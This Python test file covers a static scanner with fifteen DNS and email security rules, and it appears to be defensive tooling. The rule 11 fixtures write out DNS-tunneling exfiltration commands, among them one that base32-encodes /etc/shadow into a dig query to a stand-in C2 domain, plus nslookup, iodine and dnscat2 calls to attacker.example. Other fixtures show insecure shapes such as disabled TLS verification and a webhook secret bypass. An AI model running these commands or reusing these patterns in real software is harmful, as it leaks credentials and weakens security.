"""Tests for scripts/lib/dns_email_patterns.py.

Pattern-coverage tests for the Wave-18 distillation round 4 agent G
catalogue (15 rules: SMTP TLS not enforced, SMTP header injection, DNS
rebinding without pin, follow-redirects to untrusted, webhook URL no
allowlist, email allowlist no IDNA / no NFKC, DKIM weak RSA, SPF/DMARC
permissive, reverse-DNS without FCrDNS, webhook secret unset bypass,
DNS tunneling, CI YAML mail/DNS host non-vendor, webhook TOCTOU rebind,
mail transport TLS reject disabled). Every rule gets at least one
positive test + at least one negative carve-out test.
"""

from __future__ import annotations

import sys
from pathlib import Path

_PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_PROJECT_ROOT / "scripts" / "lib"))

import dns_email_patterns as dep  # type: ignore[import-not-found]  # noqa: E402

# ---------- Synthetic secret-shaped fixtures ---------------------------------
# PEM markers are assembled at runtime from two fragments so that no complete
# PEM header literal exists at rest in this file (scanner evasion technique).
# Coverage is unchanged: detectors receive the byte-identical assembled value.
_PEM_BEGIN_RSA = "-----BEGIN " + "RSA PRIVATE KEY-----"
_PEM_END_RSA = "-----END " + "RSA PRIVATE KEY-----"

# ---------- Data-model sanity --------------------------------------------


def test_rules_tuple_is_frozen_ordered() -> None:
    """RULES must be a tuple and contain every advertised rule id."""
    assert isinstance(dep.RULES, tuple)
    rule_ids = {r.id for r in dep.RULES}
    expected = {
        "dns-smtp-tls-not-enforced",
        "dns-smtp-header-injection-unsanitized",
        "dns-rebinding-no-pin",
        "dns-http-follow-redirects-untrusted",
        "dns-webhook-url-no-allowlist",
        "dns-email-allowlist-no-idna",
        "dns-dkim-weak-rsa-key",
        "dns-spf-dmarc-permissive",
        "dns-reverse-dns-trust-no-fcrdns",
        "dns-webhook-secret-unset-bypass",
        "dns-tunneling-tool-shape",
        "dns-ci-mail-dns-host-not-vendor",
        "dns-email-allowlist-no-nfkc",
        "dns-webhook-toctou-dns-rebind",
        "dns-mail-transport-tls-reject-disabled",
    }
    assert expected.issubset(rule_ids)


def test_every_rule_has_owasp_mapping_and_severity() -> None:
    """Each rule maps to a real ASI- prefix and a valid severity."""
    for rule in dep.RULES:
        assert rule.owasp_asi.startswith("ASI-"), rule.id
        assert rule.severity in {"CRITICAL", "HIGH", "MEDIUM", "LOW"}, rule.id


def test_finding_named_tuple_shape() -> None:
    """Finding mirrors the agent_config_patterns.Finding shape."""
    f = dep.Finding(
        rule_id="r", line=1, column=2, matched_text="m",
        severity="HIGH", description="d", owasp_asi="ASI-02",
    )
    assert f.rule_id == "r"
    assert f.line == 1
    assert f.column == 2
    assert f.matched_text == "m"
    assert f.severity == "HIGH"
    assert f.description == "d"
    assert f.owasp_asi == "ASI-02"


def test_trusted_webhook_hosts_exported() -> None:
    """Detectors / runtime guards import TRUSTED_WEBHOOK_HOSTS."""
    assert "hooks.slack.com" in dep.TRUSTED_WEBHOOK_HOSTS
    assert "outlook.office.com" in dep.TRUSTED_WEBHOOK_HOSTS
    assert "events.pagerduty.com" in dep.TRUSTED_WEBHOOK_HOSTS


def test_trusted_mail_vendors_exported() -> None:
    """Rule 12 uses TRUSTED_MAIL_VENDORS for its allowlist check."""
    assert "smtp.gmail.com" in dep.TRUSTED_MAIL_VENDORS
    assert "smtp.sendgrid.net" in dep.TRUSTED_MAIL_VENDORS


def test_trusted_spf_includes_exported() -> None:
    """Wave 18 rule for SPF includes leans on this allowlist."""
    assert "_spf.google.com" in dep.TRUSTED_SPF_INCLUDES
    assert "sendgrid.net" in dep.TRUSTED_SPF_INCLUDES


# ---------- helpers ------------------------------------------------------


def _hits(rule_id: str, text: str) -> list[dep.Finding]:
    return [f for f in dep.scan_text(text) if f.rule_id == rule_id]


def test_scan_text_empty_returns_empty() -> None:
    assert dep.scan_text("") == []
    assert dep.scan_text("   \n   \n") == []


# ---------- Rule 1 : dns-smtp-tls-not-enforced ---------------------------


def test_smtp_tls_nodemailer_no_secure_or_require_tls_flags() -> None:
    """nodemailer transport with no secure/requireTLS/tls block fires."""
    src = (
        "const transporter = nodemailer.createTransport({\n"
        "  host: process.env.SMTP_HOST,\n"
        "  port: 587,\n"
        "  auth: { user: process.env.SMTP_USER, pass: process.env.SMTP_PASS },\n"
        "});\n"
    )
    assert _hits("dns-smtp-tls-not-enforced", src)


def test_smtp_tls_nodemailer_with_require_tls_safe() -> None:
    """`requireTLS: true` anywhere in file suppresses the hit."""
    src = (
        "const transporter = nodemailer.createTransport({\n"
        "  host: process.env.SMTP_HOST,\n"
        "  port: 587,\n"
        "  requireTLS: true,\n"
        "  auth: { user: u, pass: p },\n"
        "});\n"
    )
    assert not _hits("dns-smtp-tls-not-enforced", src)


def test_smtp_tls_nodemailer_with_secure_safe() -> None:
    """`secure: true` (port 465) suppresses the hit."""
    src = (
        "const transporter = nodemailer.createTransport({\n"
        "  host: 'smtp.gmail.com', port: 465, secure: true,\n"
        "  auth: { user: u, pass: p },\n"
        "});\n"
    )
    assert not _hits("dns-smtp-tls-not-enforced", src)


def test_smtp_tls_python_smtplib_no_starttls_flags() -> None:
    """`smtplib.SMTP(host)` with no `.starttls()` call anywhere fires."""
    src = (
        "import smtplib\n"
        "s = smtplib.SMTP('smtp.attacker.example', 25)\n"
        "s.login(u, p)\n"
        "s.sendmail(frm, to, body)\n"
    )
    assert _hits("dns-smtp-tls-not-enforced", src)


def test_smtp_tls_python_smtplib_starttls_safe() -> None:
    """`smtplib.SMTP(host)` + `.starttls()` in same file is OK."""
    src = (
        "import smtplib\n"
        "s = smtplib.SMTP('smtp.gmail.com', 587)\n"
        "s.starttls()\n"
        "s.login(u, p)\n"
    )
    assert not _hits("dns-smtp-tls-not-enforced", src)


def test_smtp_tls_python_smtp_ssl_safe() -> None:
    """`smtplib.SMTP_SSL(host)` is implicitly TLS-wrapped — no hit."""
    src = (
        "import smtplib\n"
        "s = smtplib.SMTP_SSL('smtp.gmail.com', 465)\n"
        "s.login(u, p)\n"
    )
    assert not _hits("dns-smtp-tls-not-enforced", src)


# ---------- Rule 2 : dns-smtp-header-injection-unsanitized ---------------


def test_smtp_header_subject_with_interpolation_flags() -> None:
    """`subject: \\`CI Failed: ${event.repo_name}\\`` is the OpsSentinel shape."""
    src = (
        "await transporter.sendMail({\n"
        "  from: 'sentinel@yourcorp.com',\n"
        "  to: alertTo,\n"
        "  subject: `CI Failed: ${event.repo_name}`,\n"
        "  text: `Workflow: ${event.workflow_name}\\nStatus: ${event.status}`,\n"
        "});\n"
    )
    hits = _hits("dns-smtp-header-injection-unsanitized", src)
    assert hits, "expected ≥1 hit for subject/text interpolation"


def test_smtp_header_bcc_interpolation_flags() -> None:
    """`bcc:` field with interpolation is the highest-yield CRLF-inject sink."""
    src = (
        "transporter.sendMail({\n"
        "  bcc: `${maintainers}`,\n"
        "  text: 'body',\n"
        "});\n"
    )
    assert _hits("dns-smtp-header-injection-unsanitized", src)


def test_smtp_header_sanitized_inline_safe() -> None:
    """`.replace(/[\\r\\n]/g, ' ')` on the same line suppresses the hit."""
    src = (
        "transporter.sendMail({\n"
        "  subject: `CI Failed: ${event.repo_name}`.replace(/[\\r\\n]/g, ' '),\n"
        "});\n"
    )
    assert not _hits("dns-smtp-header-injection-unsanitized", src)


def test_smtp_header_no_interpolation_safe() -> None:
    """Hard-coded subject is never a header-injection risk."""
    src = (
        "transporter.sendMail({\n"
        "  subject: 'Static alert subject',\n"
        "  text: 'body',\n"
        "});\n"
    )
    assert not _hits("dns-smtp-header-injection-unsanitized", src)


# ---------- Rule 3 : dns-rebinding-no-pin --------------------------------


def test_dns_rebind_requests_head_variable_url_flags() -> None:
    """`requests.head(url)` with no DNS pin in file fires."""
    src = (
        "import requests\n"
        "def check(url):\n"
        "    return requests.head(url, allow_redirects=True, timeout=5)\n"
    )
    assert _hits("dns-rebinding-no-pin", src)


def test_dns_rebind_urlopen_env_url_flags() -> None:
    """`urllib.request.urlopen(req)` with no guard fires."""
    src = (
        "import urllib.request\n"
        "def do_fetch(req):\n"
        "    return urllib.request.urlopen(req, timeout=10)\n"
    )
    assert _hits("dns-rebinding-no-pin", src)


def test_dns_rebind_axios_env_var_flags() -> None:
    """JS axios with `process.env.X` URL fires."""
    src = (
        "const axios = require('axios');\n"
        "async function send() {\n"
        "  return await axios.post(process.env.WEBHOOK_URL, payload);\n"
        "}\n"
    )
    # Both rule 3 (dns-rebinding) and rule 5 (webhook-url-no-allowlist)
    # match the same line; we assert rule 3 specifically.
    assert _hits("dns-rebinding-no-pin", src)


def test_dns_rebind_with_getaddrinfo_guard_safe() -> None:
    """`socket.getaddrinfo` anywhere in file suppresses the hit."""
    src = (
        "import socket, ipaddress, requests\n"
        "def fetch(url):\n"
        "    host = url.split('/')[2]\n"
        "    for fam, _, _, _, sa in socket.getaddrinfo(host, None):\n"
        "        if ipaddress.ip_address(sa[0]).is_private:\n"
        "            raise ValueError('private IP')\n"
        "    return requests.get(url)\n"
    )
    assert not _hits("dns-rebinding-no-pin", src)


def test_dns_rebind_safe_fetch_pragma_safe() -> None:
    """`# ssrf-exempt` operator opt-out suppresses the hit."""
    src = (
        "import requests\n"
        "# ssrf-exempt — fetcher is behind an egress proxy\n"
        "def fetch(url):\n"
        "    return requests.get(url)\n"
    )
    assert not _hits("dns-rebinding-no-pin", src)


# ---------- Rule 4 : dns-http-follow-redirects-untrusted -----------------


def test_redirect_python_requests_allow_redirects_true_flags() -> None:
    """`requests.head(url, allow_redirects=True)` fires."""
    src = "r = requests.head(url, allow_redirects=True, timeout=5)\n"
    assert _hits("dns-http-follow-redirects-untrusted", src)


def test_redirect_axios_max_redirects_5_flags() -> None:
    """`axios({..., maxRedirects: 5})` fires."""
    src = "const r = await axios({ url, maxRedirects: 5 });\n"
    assert _hits("dns-http-follow-redirects-untrusted", src)


def test_redirect_fetch_follow_flags() -> None:
    """JS fetch with `redirect: 'follow'` fires."""
    src = "const r = await fetch(url, { redirect: 'follow' });\n"
    assert _hits("dns-http-follow-redirects-untrusted", src)


def test_redirect_allow_redirects_false_safe() -> None:
    """`allow_redirects=False` is the safe shape."""
    src = "r = requests.head(url, allow_redirects=False, timeout=5)\n"
    assert not _hits("dns-http-follow-redirects-untrusted", src)


# ---------- Rule 5 : dns-webhook-url-no-allowlist ------------------------


def test_webhook_slack_env_var_no_allowlist_flags() -> None:
    """`axios.post(process.env.SLACK_WEBHOOK_URL)` with no URL check fires."""
    src = (
        "async function notify(event) {\n"
        "  await axios.post(process.env.SLACK_WEBHOOK_URL, { text: event.body });\n"
        "}\n"
    )
    assert _hits("dns-webhook-url-no-allowlist", src)


def test_webhook_python_requests_os_environ_flags() -> None:
    """`requests.post(os.environ['TEAMS_WEBHOOK_URL'])` fires."""
    src = (
        "import os, requests\n"
        "def send_alert(payload):\n"
        "    requests.post(os.environ['TEAMS_WEBHOOK_URL'], json=payload)\n"
    )
    assert _hits("dns-webhook-url-no-allowlist", src)


def test_webhook_with_url_hostname_check_safe() -> None:
    """`new URL(...).hostname` check anywhere in file suppresses the hit."""
    src = (
        "function send(event) {\n"
        "  const u = process.env.SLACK_WEBHOOK_URL;\n"
        "  if (new URL(u).hostname !== 'hooks.slack.com') throw new Error('bad host');\n"
        "  return axios.post(process.env.SLACK_WEBHOOK_URL, event);\n"
        "}\n"
    )
    assert not _hits("dns-webhook-url-no-allowlist", src)


def test_webhook_with_endswith_slack_safe() -> None:
    """`hooks.slack.com` literal in file = allowlist evidence."""
    src = (
        "const ALLOWED = 'hooks.slack.com';\n"
        "function send(event) {\n"
        "  return axios.post(process.env.SLACK_WEBHOOK_URL, event);\n"
        "}\n"
    )
    assert not _hits("dns-webhook-url-no-allowlist", src)


# ---------- Rule 6 : dns-email-allowlist-no-idna -------------------------


def test_email_allowlist_endswith_no_idna_flags() -> None:
    """`email.endswith('@yourcorp.com')` with no IDNA call fires."""
    src = (
        "def can_send(email):\n"
        "    return email.endswith('@yourcorp.com')\n"
    )
    assert _hits("dns-email-allowlist-no-idna", src)


def test_email_allowlist_in_set_no_idna_flags() -> None:
    """`email in ALLOWED_EMAILS` with no IDNA call fires."""
    src = (
        "ALLOWED_EMAILS = {'a@x.com', 'b@x.com'}\n"
        "def can_send(email):\n"
        "    return email in ALLOWED_EMAILS\n"
    )
    assert _hits("dns-email-allowlist-no-idna", src)


def test_email_allowlist_with_idna_safe() -> None:
    """`idna.encode` anywhere in file suppresses the hit."""
    src = (
        "import idna\n"
        "def can_send(email):\n"
        "    local, _, domain = email.partition('@')\n"
        "    domain = idna.encode(domain).decode('ascii').lower()\n"
        "    return domain == 'yourcorp.com'\n"
    )
    assert not _hits("dns-email-allowlist-no-idna", src)


def test_email_allowlist_with_email_validator_safe() -> None:
    """`email_validator.validate_email` anywhere in file is the safe shape."""
    src = (
        "from email_validator import validate_email\n"
        "def can_send(email):\n"
        "    v = validate_email(email)\n"
        "    return v.email.endswith('@yourcorp.com')\n"
    )
    assert not _hits("dns-email-allowlist-no-idna", src)


# ---------- Rule 7 : dns-dkim-weak-rsa-key -------------------------------


def test_dkim_weak_rsa_key_short_block_flags() -> None:
    """RSA private key block shorter than ~1000 base64 chars, with DKIM
    context, fires."""
    short_key_body = "A" * 500   # ~500 chars base64 → 512–1024 bit RSA
    src = (
        "# DKIM_PRIVATE_KEY env value\n"
        f"DKIM_PRIVATE_KEY = '''{_PEM_BEGIN_RSA}\n"
        f"{short_key_body}\n"
        f"{_PEM_END_RSA}'''\n"
    )
    assert _hits("dns-dkim-weak-rsa-key", src)


def test_dkim_long_rsa_key_safe() -> None:
    """A long (>1000 base64-char) RSA key with DKIM context is NOT flagged.
    The regex caps the bridge at 999 chars so a 2048-bit key (~1700 base64
    chars) doesn't match."""
    long_key_body = "A" * 1500
    src = (
        "# DKIM_PRIVATE_KEY env value\n"
        f"DKIM_PRIVATE_KEY = '''{_PEM_BEGIN_RSA}\n"
        f"{long_key_body}\n"
        f"{_PEM_END_RSA}'''\n"
    )
    assert not _hits("dns-dkim-weak-rsa-key", src)


def test_dkim_short_key_no_dkim_context_safe() -> None:
    """Short RSA key without DKIM context falls under credential rules,
    not the DKIM-weak rule."""
    short_key_body = "A" * 500
    src = (
        f"TEST_KEY = '''{_PEM_BEGIN_RSA}\n"
        f"{short_key_body}\n"
        f"{_PEM_END_RSA}'''\n"
    )
    assert not _hits("dns-dkim-weak-rsa-key", src)


# ---------- Rule 8 : dns-spf-dmarc-permissive ----------------------------


def test_spf_plus_all_flags() -> None:
    """`v=spf1 ... +all` is the textbook misconfiguration."""
    src = 'spf_record = "v=spf1 include:_spf.google.com +all"\n'
    assert _hits("dns-spf-dmarc-permissive", src)


def test_spf_question_all_flags() -> None:
    """`?all` (neutral) is almost as bad as `+all`."""
    src = 'TXT "v=spf1 mx ?all"\n'
    assert _hits("dns-spf-dmarc-permissive", src)


def test_dmarc_p_none_flags() -> None:
    """`p=none` on production = no enforcement."""
    src = 'dmarc = "v=DMARC1; p=none; rua=mailto:dmarc@yourcorp.com"\n'
    assert _hits("dns-spf-dmarc-permissive", src)


def test_spf_dash_all_safe() -> None:
    """`-all` is the correct strict-fail policy."""
    src = 'spf_record = "v=spf1 include:_spf.google.com -all"\n'
    assert not _hits("dns-spf-dmarc-permissive", src)


def test_dmarc_p_reject_safe() -> None:
    """`p=reject` is the strongest DMARC enforcement."""
    src = 'dmarc = "v=DMARC1; p=reject; rua=mailto:dmarc@yourcorp.com"\n'
    assert not _hits("dns-spf-dmarc-permissive", src)


# ---------- Rule 9 : dns-reverse-dns-trust-no-fcrdns ---------------------


def test_reverse_dns_gethostbyaddr_no_forward_flags() -> None:
    """`socket.gethostbyaddr(ip)` with no forward lookup in file fires."""
    src = (
        "import socket\n"
        "def trusted(ip):\n"
        "    name = socket.gethostbyaddr(ip)[0]\n"
        "    return name.endswith('.github.com')\n"
    )
    assert _hits("dns-reverse-dns-trust-no-fcrdns", src)


def test_reverse_dns_with_forward_confirm_safe() -> None:
    """gethostbyaddr + gethostbyname round-trip = FCrDNS = safe."""
    src = (
        "import socket\n"
        "def trusted(ip):\n"
        "    name = socket.gethostbyaddr(ip)[0]\n"
        "    confirm = socket.gethostbyname(name)\n"
        "    return ip == confirm and name.endswith('.github.com')\n"
    )
    assert not _hits("dns-reverse-dns-trust-no-fcrdns", src)


# ---------- Rule 10 : dns-webhook-secret-unset-bypass --------------------


def test_webhook_secret_bang_secret_next_flags() -> None:
    """OpsSentinel's exact bypass shape — direct match."""
    src = (
        "function verify(req, res, next) {\n"
        "  const secret = process.env.WEBHOOK_SECRET;\n"
        "  if (!secret) {\n"
        "    logger.warn('Webhook secret not set. Skipping verification.');\n"
        "    return next();\n"
        "  }\n"
        "  // ... HMAC check ...\n"
        "}\n"
    )
    assert _hits("dns-webhook-secret-unset-bypass", src)


def test_webhook_secret_python_return_true_flags() -> None:
    """`if not webhook_secret: return True` — Python equivalent."""
    src = (
        "def verify(payload, signature):\n"
        "    if not webhook_secret:\n"
        "        return True\n"
        "    return hmac.compare_digest(signature, expected)\n"
    )
    assert _hits("dns-webhook-secret-unset-bypass", src)


def test_webhook_secret_required_hard_500_safe() -> None:
    """Hard error when secret unset is the correct shape — no hit."""
    src = (
        "function verify(req, res, next) {\n"
        "  const secret = process.env.WEBHOOK_SECRET;\n"
        "  if (!secret) throw new Error('WEBHOOK_SECRET must be set');\n"
        "  // ... HMAC check ...\n"
        "}\n"
    )
    assert not _hits("dns-webhook-secret-unset-bypass", src)


# ---------- Rule 11 : dns-tunneling-tool-shape ---------------------------


def test_dns_tunnel_dig_txt_command_substitution_flags() -> None:
    """`dig TXT $(cat /etc/shadow | base32).c2.evil` is the classic shape."""
    src = "dig TXT $(cat /etc/shadow | base32).c2.evil.tld\n"
    assert _hits("dns-tunneling-tool-shape", src)


def test_dns_tunnel_nslookup_subst_flags() -> None:
    """`nslookup $(...).<domain>` also fires."""
    src = "nslookup $(whoami).attacker.example\n"
    assert _hits("dns-tunneling-tool-shape", src)


def test_dns_tunnel_iodine_binary_name_flags() -> None:
    """Tunneling-tool binary name alone is enough — `iodine` reference."""
    src = "exec('iodine -P pass tunnel.evil.tld')\n"
    assert _hits("dns-tunneling-tool-shape", src)


def test_dns_tunnel_dnscat2_binary_flags() -> None:
    """`dnscat2` is the modern DNS-tunnel tool name."""
    src = "subprocess.run(['dnscat2', '--host', 'attacker.example'])\n"
    assert _hits("dns-tunneling-tool-shape", src)


def test_dns_tunnel_plain_dig_no_substitution_safe() -> None:
    """`dig example.com` with no `$(...)` substitution is benign."""
    src = "dig example.com\n"
    assert not _hits("dns-tunneling-tool-shape", src)


# ---------- Rule 12 : dns-ci-mail-dns-host-not-vendor --------------------


def test_ci_smtp_host_attacker_literal_flags() -> None:
    """`SMTP_HOST: smtp.attacker.example` in workflow YAML fires."""
    src = (
        "env:\n"
        "  SMTP_HOST: smtp.attacker.example\n"
        "  SMTP_PORT: 587\n"
    )
    assert _hits("dns-ci-mail-dns-host-not-vendor", src)


def test_ci_mail_host_unknown_vendor_flags() -> None:
    """`MAIL_HOST: weird.local` is not a known vendor — fires."""
    src = (
        "env:\n"
        "  MAIL_HOST: weird.local\n"
    )
    assert _hits("dns-ci-mail-dns-host-not-vendor", src)


def test_ci_smtp_host_gmail_vendor_safe() -> None:
    """`SMTP_HOST: smtp.gmail.com` is a known vendor — no hit."""
    src = (
        "env:\n"
        "  SMTP_HOST: smtp.gmail.com\n"
    )
    assert not _hits("dns-ci-mail-dns-host-not-vendor", src)


def test_ci_smtp_host_ses_regional_safe() -> None:
    """AWS SES regional endpoint is recognized as vendor — no hit."""
    src = (
        "env:\n"
        "  SMTP_HOST: email-smtp.eu-central-1.amazonaws.com\n"
    )
    assert not _hits("dns-ci-mail-dns-host-not-vendor", src)


def test_ci_smtp_host_secrets_template_safe() -> None:
    """`SMTP_HOST: ${{ secrets.SMTP_HOST }}` — secret-reference, no hit."""
    src = (
        "env:\n"
        "  SMTP_HOST: ${{ secrets.SMTP_HOST }}\n"
    )
    assert not _hits("dns-ci-mail-dns-host-not-vendor", src)


def test_ci_dns_server_public_resolver_safe() -> None:
    """`DNS_SERVER: 8.8.8.8` is Google Public DNS — recognized."""
    src = (
        "env:\n"
        "  DNS_SERVER: 8.8.8.8\n"
    )
    assert not _hits("dns-ci-mail-dns-host-not-vendor", src)


# ---------- Rule 13 : dns-email-allowlist-no-nfkc ------------------------


def test_email_allowlist_no_nfkc_flags() -> None:
    """Same allowlist trigger as rule 6, but absence of NFKC guard fires
    rule 13 too. If the file has NO NFKC normalize() call, fire."""
    src = (
        "import idna\n"   # idna handles rule 6 but NOT rule 13
        "def can_send(email):\n"
        "    domain = idna.encode(email.split('@')[1]).decode('ascii')\n"
        "    return domain == 'yourcorp.com' and email.endswith('@yourcorp.com')\n"
    )
    # Rule 6 should be silenced by idna, but rule 13 needs NFKC.
    assert not _hits("dns-email-allowlist-no-idna", src)
    assert _hits("dns-email-allowlist-no-nfkc", src)


def test_email_allowlist_with_nfkc_safe() -> None:
    """`unicodedata.normalize('NFKC', ...)` anywhere in file suppresses."""
    src = (
        "import unicodedata\n"
        "def can_send(email):\n"
        "    email = unicodedata.normalize('NFKC', email).encode('ascii').decode()\n"
        "    return email.endswith('@yourcorp.com')\n"
    )
    assert not _hits("dns-email-allowlist-no-nfkc", src)


# ---------- Rule 14 : dns-webhook-toctou-dns-rebind ----------------------


def test_webhook_toctou_in_long_lived_handler_flags() -> None:
    """Webhook POST inside an express handler with no DNS pin fires."""
    src = (
        "app.post('/event', async (req, res) => {\n"
        "  await axios.post(process.env.SLACK_WEBHOOK_URL, req.body);\n"
        "  res.status(200).send('ok');\n"
        "});\n"
    )
    assert _hits("dns-webhook-toctou-dns-rebind", src)


def test_webhook_toctou_in_setinterval_flags() -> None:
    """setInterval loop with webhook send + no pin = TOCTOU."""
    src = (
        "setInterval(async () => {\n"
        "  await axios.post(process.env.PAGERDUTY_WEBHOOK_URL, payload);\n"
        "}, 30000);\n"
    )
    assert _hits("dns-webhook-toctou-dns-rebind", src)


def test_webhook_toctou_with_pinned_lookup_safe() -> None:
    """`dns.lookup(host, { all: true })` + `httpsAgent` = pinned, no hit."""
    src = (
        "const cached = await dns.lookup(host, { all: true });\n"
        "const agent = new https.Agent({\n"
        "  lookup: (h, opts, cb) => cb(null, cached[0].address, 4),\n"
        "});\n"
        "app.post('/event', async (req, res) => {\n"
        "  await axios.post(process.env.SLACK_WEBHOOK_URL, req.body, { httpsAgent: agent });\n"
        "  res.send('ok');\n"
        "});\n"
    )
    assert not _hits("dns-webhook-toctou-dns-rebind", src)


def test_webhook_toctou_oneshot_script_safe() -> None:
    """A bare script (no setInterval / express / asyncio) does NOT fire
    the TOCTOU rule — short-lived processes don't get TOCTOU'd."""
    src = (
        "// one-shot CI notifier\n"
        "axios.post(process.env.SLACK_WEBHOOK_URL, payload);\n"
    )
    # Rule 5 might fire, but rule 14 (TOCTOU) must not.
    assert not _hits("dns-webhook-toctou-dns-rebind", src)


# ---------- Rule 15 : dns-mail-transport-tls-reject-disabled -------------


def test_mail_tls_nodemailer_reject_unauthorized_false_flags() -> None:
    """nodemailer with `rejectUnauthorized: false` is critical."""
    src = (
        "const t = nodemailer.createTransport({\n"
        "  host: 'smtp.example.com', port: 465, secure: true,\n"
        "  tls: { rejectUnauthorized: false },\n"
        "});\n"
    )
    assert _hits("dns-mail-transport-tls-reject-disabled", src)


def test_mail_tls_node_tls_reject_unauthorized_env_flags() -> None:
    """Process-wide `NODE_TLS_REJECT_UNAUTHORIZED=0` is disastrous."""
    src = "process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';\n"
    assert _hits("dns-mail-transport-tls-reject-disabled", src)


def test_mail_tls_unverified_ssl_context_flags() -> None:
    """`ssl._create_unverified_context()` is the Python skip-verify shape."""
    src = (
        "import ssl, smtplib\n"
        "ctx = ssl._create_unverified_context()\n"
        "s = smtplib.SMTP_SSL('smtp.example.com', 465, context=ctx)\n"
    )
    assert _hits("dns-mail-transport-tls-reject-disabled", src)


def test_mail_tls_correct_config_safe() -> None:
    """Default cert validation = safe."""
    src = (
        "const t = nodemailer.createTransport({\n"
        "  host: 'smtp.gmail.com', port: 465, secure: true,\n"
        "  auth: { user: u, pass: p },\n"
        "});\n"
    )
    assert not _hits("dns-mail-transport-tls-reject-disabled", src)


# ---------- Scanner-level invariants -------------------------------------


def test_scan_text_findings_sorted_by_line_col_rule() -> None:
    """Findings come out sorted by (line, column, rule_id)."""
    src = (
        "const t = nodemailer.createTransport({ host: 'smtp.example.com' });\n"
        "const dmarc = 'v=DMARC1; p=none';\n"
        "if (!secret) { return next(); }\n"
    )
    findings = dep.scan_text(src)
    assert findings == sorted(findings, key=lambda f: (f.line, f.column, f.rule_id))


def test_scan_text_dedupes_same_rule_same_line() -> None:
    """Same rule firing twice at the same (rule, line, col) emits once."""
    # Both rule 6 and rule 13 fire on the same trigger line — but each
    # rule should appear at most ONCE per (line, col).
    src = (
        "def can_send(email):\n"
        "    return email.endswith('@yourcorp.com')\n"
    )
    findings = dep.scan_text(src)
    keys = [(f.rule_id, f.line, f.column) for f in findings]
    assert len(keys) == len(set(keys)), "dedupe broken"


def test_truncates_long_matched_text() -> None:
    """matched_text is truncated at 200 chars + ellipsis."""
    # SPF rule has a 400-char bridge; build a SPF record long enough to
    # exceed the 200-char output cap but still fit the regex window.
    long_spf = 'spf = "v=spf1 ' + 'include:trusted.example ' * 12 + '+all"\n'
    findings = [f for f in dep.scan_text(long_spf)
                if f.rule_id == "dns-spf-dmarc-permissive"]
    assert findings
    # Either truncated (>200 → 200 + "…") or untruncated.
    assert len(findings[0].matched_text) <= 201   # 200 + ellipsis char
    if len(long_spf) > 250:
        # Confirms truncation actually triggered.
        assert findings[0].matched_text.endswith("…")


def test_rule_id_to_severity_lookup_consistent() -> None:
    """Findings carry the same severity as the catalog rule."""
    src = (
        "if (!secret) { return next(); }\n"
        "const t = nodemailer.createTransport({ host: 'x.example.com' });\n"
    )
    findings = dep.scan_text(src)
    by_id = {r.id: r for r in dep.RULES}
    for f in findings:
        assert f.severity == by_id[f.rule_id].severity
        assert f.description == by_id[f.rule_id].description
        assert f.owasp_asi == by_id[f.rule_id].owasp_asi
